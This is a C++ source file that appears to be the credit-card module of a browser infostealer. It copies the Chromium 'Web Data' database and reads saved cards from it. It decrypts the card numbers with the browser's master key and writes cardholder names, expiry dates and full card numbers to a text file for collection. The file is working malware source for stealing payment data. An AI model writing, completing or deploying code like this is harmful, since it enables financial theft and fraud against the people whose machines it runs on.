//
// Created by .1qxz on 08.06.2024.
//

#include "CCreditCards.h"

void CCreditCards::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "Web Data";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<CreditCard> history = this->getCreditCards(copied_db);

    fs::remove(copied_db);

    if(history.empty())
        return;

    std::stringstream ss;

    for(CreditCard &row : history)
        row.write(ss);

    Utils::writeFile(root / "Credit Cards.txt", ss.str(), true);
}

std::list<CreditCard> CCreditCards::getCreditCards(const fs::path &db_path) {
    std::list<CreditCard> cards;

    SQLiteUtil::connectAndRead("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards ORDER BY use_count DESC", db_path, [this, &cards](sqlite3_stmt *stmt) {
        const unsigned char* name_on_card = sqlite3_column_text(stmt, 0);
        int expiration_month = sqlite3_column_int(stmt, 1);
        int expiration_year = sqlite3_column_int(stmt, 2);

        const void* card_number_encrypted = sqlite3_column_blob(stmt, 3);
        int card_number_size = sqlite3_column_bytes(stmt, 3);

        CreditCard creditCardRecord;
        creditCardRecord.name_on_card = std::string(reinterpret_cast<const char*>(name_on_card));
        creditCardRecord.expiration_month = expiration_month;
        creditCardRecord.expiration_year = expiration_year;

        std::vector<BYTE> card_number;
        card_number.assign(static_cast<const BYTE*>(card_number_encrypted), static_cast<const BYTE*>(card_number_encrypted) + card_number_size);

        std::vector<BYTE> master_key = this->getMasterKey();

        std::string decoded_card_number = ChromiumUtil::decryptData(card_number, master_key);
        creditCardRecord.card_number = decoded_card_number;

        cards.push_back(creditCardRecord);
    });

    return cards;
}
